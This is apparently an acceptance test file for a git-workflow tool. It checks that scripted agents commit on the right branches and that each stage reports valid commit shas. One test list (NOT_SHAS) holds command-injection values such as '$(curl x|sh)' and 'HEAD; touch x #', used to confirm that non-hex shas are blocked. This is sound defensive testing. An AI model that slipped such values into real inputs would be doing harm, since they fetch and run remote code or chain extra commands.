// Acceptance tests for the commits group (docs/temper/v0-2/behaviour.md, COMMITS-01..13): commits
// reach their branch, and every stage reports its commits (spec 3.1).
// They drive the bundled workflows (build, stabilise, publish) through the harness with scripted
// agents, the way the head launches them with args.json. A test that fails because of the product
// is skipped with "acceptance-failing: <id>".
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runWorkflow } from '../harness.mjs';

const EPIC = 'e';
const BRANCH = 'temper/e';
const SSH = { kind: 'ssh', name: 'buildhost', root: '/srv/temper/', clone: '/srv/repo' };
const LOCAL_DIR = '/r/.temper/worktrees/e';
const SSH_DIR = '/srv/temper/e';

const task = (id, wave) => ({
  id,
  title: `Title ${id}`,
  wave,
  owns: [`src/${id}.rs`],
  uses: [],
  provides: [],
  text: `build ${id}`,
});

const GROUPS = [
  { key: 'g1', behaviours: [{ id: 'G1-01', text: 'given x then y' }] },
  { key: 'g2', behaviours: [{ id: 'G2-01', text: 'given m then n' }] },
];

function buildArgs(extra = {}) {
  return {
    epic: EPIC,
    repo: '/r',
    branch: BRANCH,
    base: 'main',
    spec: 'docs/temper/e/spec.md',
    plan: 'docs/temper/e/plan.md',
    log: 'docs/temper/e/log.md',
    host: { kind: 'local' },
    gates: { quick: 'QUICK', full: 'FULL' },
    tasks: [task('a', 0), task('b', 1)],
    behaviour_groups: [{ key: 'g1', title: 'Group 1' }, { key: 'g2', title: 'Group 2' }],
    done: [],
    answers: {},
    ...extra,
  };
}

const idOf = (label) => label.slice(label.indexOf(':') + 1);

// Every build agent succeeds and reports a commit sha; acceptance:g1 reports G1-01 failing, so a green
// round runs. `over[label]` overrides one agent (a value, or a function of the call).
const SHAS = {
  checkpoint: 'c0ffee01',
  'behaviour-spec': 'beef0002',
  'acceptance:g1': 'acce0003',
  'acceptance:g2': 'acce0004',
  'green:1': '9ee90005',
};
function buildResponder(over = {}) {
  return (call) => {
    const { label } = call;
    if (Object.prototype.hasOwnProperty.call(over, label)) {
      const v = over[label];
      return typeof v === 'function' ? v(call) : v;
    }
    const id = idOf(label);
    if (label.startsWith('impl:') || label.startsWith('retry:')) {
      return { status: 'done', branch: `temper/e/${id}`, commit: 'abcdef12', summary: `did ${id}` };
    }
    if (label.startsWith('check:') || label.startsWith('recheck:')) return { status: 'done', pass: true, problems: [] };
    if (label.startsWith('merge:')) return { status: 'merged', merged: [], gate_passed: true };
    if (label === 'checkpoint') {
      return { status: 'done', gate_passed: true, gate_log: 'full.log', flows: [{ flow: 'f', result: 'ok', evidence: 'ran' }], gaps: [], commit: SHAS.checkpoint };
    }
    if (label === 'behaviour-spec') return { status: 'done', groups: GROUPS, commit: SHAS['behaviour-spec'] };
    if (label === 'acceptance:g1') {
      return { status: 'done', group: 'g1', passing: [], failing: [{ id: 'G1-01', observed: 'wrong' }], untestable: [], commit: SHAS[label] };
    }
    if (label === 'acceptance:g2') return { status: 'done', group: 'g2', passing: ['G2-01'], failing: [], untestable: [], commit: SHAS[label] };
    if (label.startsWith('green:')) {
      return { status: 'done', fixed: ['G1-01'], corrected: [], questions: [], still_failing: [], commit: SHAS[label] ?? '' };
    }
    return null;
  };
}

const runBuild = (args, over) => runWorkflow('workflows/build.js', { args, respond: buildResponder(over) });

function stabiliseFixArgs(extra = {}) {
  return {
    epic: EPIC,
    repo: '/r',
    branch: BRANCH,
    base: 'main',
    log: 'docs/temper/e/log.md',
    host: { kind: 'local' },
    gates: { quick: 'QUICK', full: 'FULL' },
    part: 'fix',
    lenses: [],
    severity_notes: '',
    done: [],
    selected: [finding('f1', 'critical'), finding('f2', 'important')],
    ...extra,
  };
}

function finding(id, severity) {
  return {
    id,
    lens: 'security',
    file: 'src/a.rs',
    line: id === 'f1' ? 10 : 20,
    summary: `summary of ${id}`,
    input: `INPUT-${id}`,
    wrong_result: `WRONG-${id}`,
    severity,
    kind: 'fix',
  };
}

// Scripted stabilise agents: no findings in any sweep, every fix lands with `fixShas[id]`, no regressions.
function stabiliseResponder(fixShas = {}) {
  return ({ label }) => {
    if (label.startsWith('second:review:') || label.startsWith('review:')) return { status: 'done', findings: [] };
    if (label.startsWith('regress:')) return { status: 'done', regressions: [] };
    if (label.startsWith('fix:')) {
      const id = label.slice('fix:'.length);
      return { status: 'fixed', commit: fixShas[id] ?? '', note: 'done' };
    }
    throw new Error(`unexpected label ${label}`);
  };
}

function publishArgs(extra = {}) {
  return {
    epic: EPIC,
    repo: '/r',
    branch: BRANCH,
    base: 'main',
    log: 'docs/temper/e/log.md',
    spec: 'docs/temper/e/spec.md',
    host: { kind: 'local' },
    gates: { quick: 'QUICK', full: 'FULL' },
    done: [],
    ...extra,
  };
}

const publishResponder = ({ label }) => ({
  docs: { status: 'done', commit: 'd0c50001', files: ['README.md'], summary: 'docs' },
  evidence: { status: 'done', script: 'evidence.sh', checklist: 'checklist.md', commit: 'e71d0002' },
  gate: { status: 'done', passed: true, exit_status: 0, log_path: '/l' },
})[label];

const promptOf = (calls, label) => {
  const c = calls.find((x) => x.opts?.label === label);
  assert.ok(c, `no agent call labelled ${label}; calls: ${calls.map((x) => x.opts?.label).join(', ')}`);
  return c.prompt;
};

// Every prompt of an agent that commits on the epic branch, labelled, for a host: the build's merge
// and phase agents, the stabilise fix agents, and the publish docs and evidence agents.
async function epicCommitterPrompts(host) {
  const out = [];
  const b = await runBuild(buildArgs({ host }));
  for (const l of ['merge:wave0', 'merge:wave1', 'checkpoint', 'behaviour-spec', 'acceptance:g1', 'acceptance:g2', 'green:1']) {
    out.push({ label: l, prompt: promptOf(b.calls, l) });
  }
  const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs({ host }), respond: stabiliseResponder({ f1: 'aa', f2: 'bb' }) });
  for (const l of ['fix:f1', 'fix:f2']) out.push({ label: l, prompt: promptOf(s.calls, l) });
  const p = await runWorkflow('workflows/publish.js', { args: publishArgs({ host }), respond: publishResponder });
  for (const l of ['docs', 'evidence']) out.push({ label: l, prompt: promptOf(p.calls, l) });
  return out;
}

// Every committing agent's prompt with the branch it commits on: the implementers (task branches)
// and the epic-branch agents.
async function allCommitterPrompts(host) {
  const b = await runBuild(buildArgs({ host }));
  const impls = ['impl:a', 'impl:b'].map((l) => ({ label: l, prompt: promptOf(b.calls, l), branch: `temper/e/${idOf(l)}` }));
  // A retry is an implementer too.
  const r = await runBuild(buildArgs({ host }), { 'check:a': { status: 'done', pass: false, problems: ['p'] } });
  impls.push({ label: 'retry:a', prompt: promptOf(r.calls, 'retry:a'), branch: 'temper/e/a' });
  const epic = (await epicCommitterPrompts(host)).map((x) => ({ ...x, branch: BRANCH }));
  return [...impls, ...epic];
}

const has = (prompt, text, what) => assert.ok(prompt.includes(text), `${what}: prompt lacks ${JSON.stringify(text)}:\n${prompt}`);

// ---------------------------------------------------------------------------

test('COMMITS-01 the implementer is told to create the task worktree with the task branch checked out', async () => {
  for (const [host, dir] of [[{ kind: 'local' }, LOCAL_DIR], [SSH, SSH_DIR]]) {
    const { calls } = await runBuild(buildArgs({ host }));
    for (const id of ['a', 'b']) {
      const p = promptOf(calls, `impl:${id}`);
      const branch = `temper/e/${id}`;
      const path = `${dir}/${id}`;
      has(p, `git worktree add -b ${branch} ${path} ${BRANCH}`, `impl:${id} (${host.kind})`);
      has(p, `git worktree add ${path} ${branch}`, `impl:${id} (${host.kind})`);
      assert.match(p, new RegExp(`git worktree add ${path} ${branch}\`[^.\\n]*when the branch exists`), `impl:${id}: the second form is for an existing branch`);
    }
  }
});

test('COMMITS-02 merge, phase, fix, docs and evidence agents commit in the one shared epic worktree', async () => {
  for (const [host, dir] of [[{ kind: 'local' }, LOCAL_DIR], [SSH, SSH_DIR]]) {
    const path = `${dir}/epic`;
    for (const { label, prompt } of await epicCommitterPrompts(host)) {
      const what = `${label} (${host.kind})`;
      has(prompt, `shared epic worktree \`${path}\``, what);
      has(prompt, `with \`${BRANCH}\` checked out`, what);
      assert.match(prompt, /Reuse it if it exists/, `${what}: reuse it when it exists`);
      has(prompt, `git worktree add ${path} ${BRANCH}`, what);
      // No other worktree for these agents: the epic path is the only worktree path named under the dir.
      const others = [...prompt.matchAll(new RegExp(`${dir.replace(/[/.]/g, '\\$&')}/([\\w.-]+)`, 'g'))].map((m) => m[1]);
      assert.deepEqual([...new Set(others)], ['epic'], `${what}: names another worktree: ${others}`);
    }
  }
});

test('COMMITS-03 every committing agent checks its branch before committing and that it moved after', async () => {
  for (const host of [{ kind: 'local' }, SSH]) {
    for (const { label, prompt, branch } of await allCommitterPrompts(host)) {
      const what = `${label} (${host.kind})`;
      assert.match(prompt, new RegExp(`before committing, \`git symbolic-ref --short HEAD\` must print \`${branch}\``), what);
      assert.match(prompt, new RegExp(`after committing, \`git rev-parse ${branch}\` must equal \`git rev-parse HEAD\``), what);
    }
  }
});

test('COMMITS-04 a failed branch check returns blocked with the reason, never a hand repair', async () => {
  for (const host of [{ kind: 'local' }, SSH]) {
    for (const { label, prompt } of await allCommitterPrompts(host)) {
      const what = `${label} (${host.kind})`;
      assert.match(prompt, /if either check fails, return status "blocked" with the reason/, what);
      assert.match(prompt, /Never repair a branch by hand/, what);
    }
  }
});

test('COMMITS-05 on an ssh host the epic worktree is detached only after the after-commit check, and checked out again next', async () => {
  for (const { label, prompt } of await epicCommitterPrompts(SSH)) {
    const detach = prompt.indexOf('`git switch --detach` in it, only after the commit check passed');
    assert.ok(detach >= 0, `${label}: no detach-after-check:\n${prompt}`);
    // The commit check it refers to holds the after-commit check.
    assert.match(prompt, /after committing, `git rev-parse temper\/e` must equal `git rev-parse HEAD`/, label);
    // The next agent checks the branch out again when it finds the worktree detached.
    has(prompt, `if its HEAD is detached, \`git switch ${BRANCH}\` in it`, label);
  }
  // A local run never detaches the shared worktree.
  for (const { label, prompt } of await epicCommitterPrompts({ kind: 'local' })) {
    assert.ok(!prompt.includes('git switch --detach'), `${label} (local) detaches`);
  }
});

test('COMMITS-06 the checker confirms the task branch tip is the reported commit and not already on the epic branch', async () => {
  // A real repo: the epic branch (epic/e: git can't hold temper/e beside temper/e/a), a task branch with one commit, and a task branch that never moved.
  const dir = mkdtempSync(join(tmpdir(), 'temper-commits-'));
  const EPIC_BRANCH = 'epic/e';
  const git = (...a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
  try {
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 't@example.invalid');
    git('config', 'user.name', 't');
    git('config', 'commit.gpgsign', 'false');
    writeFileSync(join(dir, 'a'), '1\n');
    git('add', '.');
    git('commit', '-q', '-m', 'init');
    git('branch', EPIC_BRANCH);
    git('checkout', '-q', '-b', 'temper/e/a', EPIC_BRANCH);
    writeFileSync(join(dir, 'a'), '2\n');
    git('commit', '-q', '-am', 'feat: a');
    const moved = git('rev-parse', 'HEAD');
    git('branch', 'temper/e/b', EPIC_BRANCH);
    const unmoved = git('rev-parse', EPIC_BRANCH);

    // The checker's tip check, run as its prompt says; true when it holds.
    const tipHolds = (prompt, branch) => {
      const m = prompt.match(/`git rev-parse ([^`]+)` equals the commit the implementer reported \(`([0-9a-f]+)`\), and `(git merge-base --is-ancestor [^`]+)` exits non-zero/);
      assert.ok(m, `the checker is not asked to confirm the tip:\n${prompt}`);
      assert.equal(m[1], branch);
      const tipIs = git('rev-parse', m[1]) === m[2];
      const r = spawnSync('sh', ['-c', m[3]], { cwd: dir });
      return tipIs && r.status !== 0;
    };

    const { calls } = await runBuild(buildArgs({ branch: EPIC_BRANCH, tasks: [task('a', 0), task('b', 0)] }), {
      'impl:a': { status: 'done', branch: 'temper/e/a', commit: moved, summary: 'did a' },
      'impl:b': { status: 'done', branch: 'temper/e/b', commit: unmoved, summary: 'did b' },
    });
    const pa = promptOf(calls, 'check:a');
    has(pa, `git merge-base --is-ancestor ${moved} ${EPIC_BRANCH}`, 'check:a');
    assert.equal(tipHolds(pa, 'temper/e/a'), true, 'a task branch with its own commit passes the tip check');
    const pb = promptOf(calls, 'check:b');
    assert.equal(tipHolds(pb, 'temper/e/b'), false, 'a tip that did not move fails the tip check');
    for (const p of [pa, pb]) assert.match(p, /A tip that didn't move fails the check/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('COMMITS-07 build.js returns commits mapping each phase id to its sha', async () => {
  const { result } = await runBuild(buildArgs());
  assert.equal(result.status, 'mvp', JSON.stringify(result));
  assert.ok(result.commits && typeof result.commits === 'object', 'no commits');
  for (const [id, sha] of Object.entries(SHAS)) assert.equal(result.commits[id], sha, `commits[${id}]`);
});

test('COMMITS-08 the checkpoint and green schemas have a commit field that may be empty', async () => {
  const { calls } = await runBuild(buildArgs());
  for (const label of ['checkpoint', 'green:1']) {
    const schema = calls.find((c) => c.opts?.label === label)?.opts?.schema;
    assert.ok(schema && schema.properties, `${label}: no schema`);
    const commit = schema.properties.commit;
    assert.ok(commit, `${label}: schema has no commit field`);
    assert.equal(commit.type, 'string', `${label}: commit is a string`);
    // Empty when nothing was committed: '' is a valid value.
    assert.ok(!(commit.minLength > 0), `${label}: commit forbids ''`);
    if (commit.pattern) assert.match('', new RegExp(commit.pattern), `${label}: commit pattern forbids ''`);
    if (commit.enum) assert.ok(commit.enum.includes(''), `${label}: commit enum forbids ''`);
  }
});

test('COMMITS-09 an empty reported sha is left out of commits', async () => {
  const over = {
    checkpoint: { status: 'done', gate_passed: true, gate_log: 'full.log', flows: [], gaps: [], commit: '' },
    'acceptance:g2': { status: 'done', group: 'g2', passing: ['G2-01'], failing: [], untestable: [], commit: '' },
    'green:1': { status: 'done', fixed: ['G1-01'], corrected: [], questions: [], still_failing: [], commit: '' },
  };
  const { result } = await runBuild(buildArgs(), over);
  assert.ok(result.commits, 'no commits');
  for (const id of ['checkpoint', 'acceptance:g2', 'green:1']) {
    assert.ok(!Object.prototype.hasOwnProperty.call(result.commits, id), `${id} is in commits: ${JSON.stringify(result.commits)}`);
  }
  assert.equal(result.commits['behaviour-spec'], SHAS['behaviour-spec']);
  assert.equal(result.commits['acceptance:g1'], SHAS['acceptance:g1']);
  for (const [id, sha] of Object.entries(result.commits)) assert.ok(typeof sha === 'string' && sha !== '', `${id}: empty sha`);

  // The same for stabilise and publish.
  const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: 'aa11bb22' }) });
  assert.deepEqual(s.result.commits, { 'fix:f1': 'aa11bb22' });
  const p = await runWorkflow('workflows/publish.js', {
    args: publishArgs(),
    respond: (q) => (q.label === 'docs' ? { status: 'done', commit: '', files: [], summary: 'nothing' } : publishResponder(q)),
  });
  assert.deepEqual(p.result.commits, { evidence: 'e71d0002' });
});

test('COMMITS-10 every build result after validation carries commits', async () => {
  const doneAll = ['a', 'b', 'checkpoint', 'behaviour-spec', 'acceptance:g1', 'acceptance:g2', 'green:1', 'green:2'];
  const scenarios = [
    { name: 'mvp', over: {} },
    { name: 'implementer blocked', over: { 'impl:a': { status: 'blocked', question: 'q?' } } },
    { name: 'implementer returned nothing', over: { 'impl:a': null } },
    { name: 'merge blocked', over: { 'merge:wave0': { status: 'blocked', merged: [], gate_passed: false } } },
    { name: 'checkpoint gate failed', over: { checkpoint: { status: 'done', gate_passed: false, gate_log: 'l', flows: [], gaps: [], commit: '' } } },
    { name: 'checkpoint returned nothing', over: { checkpoint: null } },
    { name: 'behaviour-spec returned nothing', over: { 'behaviour-spec': null } },
    { name: 'acceptance returned nothing', over: { 'acceptance:g2': null } },
    { name: 'green returned nothing', over: { 'green:1': null } },
    { name: 'green questions', over: { 'green:1': { status: 'done', fixed: [], corrected: [], questions: [{ id: 'G1-01', question: 'q' }], still_failing: [] } } },
    { name: 'resumed with everything done', args: { done: doneAll, behaviour: GROUPS } },
  ];
  for (const s of scenarios) {
    const { result } = await runBuild(buildArgs(s.args ?? {}), s.over ?? {});
    assert.notEqual(result.status, 'invalid', `${s.name}: ${JSON.stringify(result)}`);
    assert.ok(result.commits && typeof result.commits === 'object' && !Array.isArray(result.commits), `${s.name}: no commits field: ${JSON.stringify(result)}`);
  }
});

test('COMMITS-11 a stabilise fix run returns commits mapping each fix:<id> to its sha', async () => {
  const { result } = await runWorkflow('workflows/stabilise.js', {
    args: stabiliseFixArgs(),
    respond: stabiliseResponder({ f1: 'f1f1f1f1', f2: 'f2f2f2f2' }),
  });
  assert.deepEqual(result.commits, { 'fix:f1': 'f1f1f1f1', 'fix:f2': 'f2f2f2f2' });
});

test('COMMITS-12 a publish run returns commits with the docs and evidence shas', async () => {
  const { result } = await runWorkflow('workflows/publish.js', { args: publishArgs(), respond: publishResponder });
  assert.deepEqual(result.commits, { docs: 'd0c50001', evidence: 'e71d0002' });
});

// Owner's decision (spec 8, security-01): the head runs git on every commits value, so only a hex sha
// goes in; any other reported value is left out and its id blocked with 'commit is not a sha'.
const NOT_SHAS = ['$(curl x|sh)', 'HEAD; touch x #', 'HEAD'];

test('COMMITS-13 a reported commit that is not a hex sha is left out of commits and blocked', async () => {
  for (const bad of NOT_SHAS) {
    // build: the phase that reported it blocks, and what came before it stays.
    const b = await runBuild(buildArgs(), {
      'acceptance:g1': { status: 'done', group: 'g1', passing: [], failing: [{ id: 'G1-01', observed: 'wrong' }], untestable: [], commit: bad },
    });
    assert.equal(b.result.status, 'blocked', `build ${bad}: ${JSON.stringify(b.result)}`);
    assert.deepEqual(b.result.blocked, [{ id: 'acceptance:g1', reason: 'commit is not a sha' }], bad);
    assert.deepEqual(b.result.commits, { checkpoint: SHAS.checkpoint, 'behaviour-spec': SHAS['behaviour-spec'] }, bad);
    const cp = await runBuild(buildArgs(), {
      checkpoint: { status: 'done', gate_passed: true, gate_log: 'full.log', flows: [], gaps: [], commit: bad },
    });
    assert.equal(cp.result.status, 'blocked', bad);
    assert.deepEqual(cp.result.blocked, [{ id: 'checkpoint', reason: 'commit is not a sha' }], bad);
    assert.deepEqual(cp.result.commits, {}, bad);

    // stabilise: that fix is blocked, never counted fixed; the other fix's sha stays.
    const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: bad, f2: 'f2f2f2f2' }) });
    assert.equal(s.result.status, 'blocked', `stabilise ${bad}: ${JSON.stringify(s.result)}`);
    assert.deepEqual(s.result.commits, { 'fix:f2': 'f2f2f2f2' }, bad);
    assert.deepEqual(s.result.blocked, [{ id: 'f1', reason: 'commit is not a sha' }], bad);
    assert.ok(!s.result.fixed.includes('f1'), bad);

    // publish: docs or evidence blocks there, and nothing of it reaches commits.
    for (const id of ['docs', 'evidence']) {
      const p = await runWorkflow('workflows/publish.js', {
        args: publishArgs(),
        respond: (q) => (q.label === id ? { ...publishResponder(q), commit: bad } : publishResponder(q)),
      });
      assert.equal(p.result.status, 'blocked', `publish ${id} ${bad}: ${JSON.stringify(p.result)}`);
      assert.deepEqual(p.result.blocked, [{ id, reason: 'commit is not a sha' }], bad);
      assert.deepEqual(p.result.commits, id === 'docs' ? {} : { docs: 'd0c50001' }, bad);
      for (const v of Object.values(p.result.commits)) assert.match(v, /^[0-9a-f]{7,64}$/);
    }
  }
});

// Owner's decision (spec 8, regress-security-01): the pattern is /^[0-9a-f]{7,64}$/, so a SHA-256 sha
// (64 hex) goes into commits like a SHA-1 one; an uppercase sha, a 6-character one or a 65-character
// one is not a sha and blocks its id.
const SHA256 = 'f'.repeat(24) + '0123456789abcdef0123456789abcdef01234567';
const NOT_SHAS_BY_FORM = ['ABCDEF12', SHA256.toUpperCase(), 'abcdef', 'a'.repeat(65)];

test('COMMITS-13 a 64-character SHA-256 sha goes into commits in build, stabilise and publish', async () => {
  assert.equal(SHA256.length, 64);
  const b = await runBuild(buildArgs(), {
    checkpoint: { status: 'done', gate_passed: true, gate_log: 'full.log', flows: [], gaps: [], commit: SHA256 },
  });
  assert.equal(b.result.commits.checkpoint, SHA256, JSON.stringify(b.result));
  assert.ok(!(b.result.blocked || []).some((x) => x.id === 'checkpoint'), JSON.stringify(b.result));

  const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: SHA256, f2: 'f2f2f2f2' }) });
  assert.deepEqual(s.result.commits, { 'fix:f1': SHA256, 'fix:f2': 'f2f2f2f2' }, JSON.stringify(s.result));
  assert.ok(s.result.fixed.includes('f1'));

  const p = await runWorkflow('workflows/publish.js', {
    args: publishArgs(),
    respond: (q) => (q.label === 'evidence' ? { ...publishResponder(q), commit: SHA256 } : publishResponder(q)),
  });
  assert.deepEqual(p.result.commits, { docs: 'd0c50001', evidence: SHA256 }, JSON.stringify(p.result));
});

test('COMMITS-13 an uppercase, 6-character or 65-character sha is left out of commits and blocked', async () => {
  for (const bad of NOT_SHAS_BY_FORM) {
    const cp = await runBuild(buildArgs(), {
      checkpoint: { status: 'done', gate_passed: true, gate_log: 'full.log', flows: [], gaps: [], commit: bad },
    });
    assert.equal(cp.result.status, 'blocked', bad);
    assert.deepEqual(cp.result.blocked, [{ id: 'checkpoint', reason: 'commit is not a sha' }], bad);
    assert.deepEqual(cp.result.commits, {}, bad);

    const s = await runWorkflow('workflows/stabilise.js', { args: stabiliseFixArgs(), respond: stabiliseResponder({ f1: bad, f2: 'f2f2f2f2' }) });
    assert.deepEqual(s.result.commits, { 'fix:f2': 'f2f2f2f2' }, bad);
    assert.deepEqual(s.result.blocked, [{ id: 'f1', reason: 'commit is not a sha' }], bad);

    const p = await runWorkflow('workflows/publish.js', {
      args: publishArgs(),
      respond: (q) => (q.label === 'evidence' ? { ...publishResponder(q), commit: bad } : publishResponder(q)),
    });
    assert.deepEqual(p.result.blocked, [{ id: 'evidence', reason: 'commit is not a sha' }], bad);
    assert.deepEqual(p.result.commits, { docs: 'd0c50001' }, bad);
  }
});
